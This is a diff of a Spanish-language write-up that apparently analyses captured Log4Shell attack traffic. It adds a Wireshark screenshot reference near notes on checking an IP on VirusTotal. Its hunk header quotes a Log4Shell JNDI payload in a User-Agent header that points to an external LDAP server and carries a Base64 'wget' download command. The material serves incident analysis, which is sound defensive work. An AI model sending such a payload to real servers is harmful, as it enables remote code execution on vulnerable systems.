@@ -57,9 +57,15 @@ User-Agent: ${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8v
 ```
 
 
+Detalle del tráfico en el Log4Shell:
+![](capturas/wireshark-log4shell.png)
+
+
 ### Analizamos la web que nos aparece con Virustotal
 IP: 62.210.130.250
 ![](capturas/virustotal.png)
+
+
 
 
 
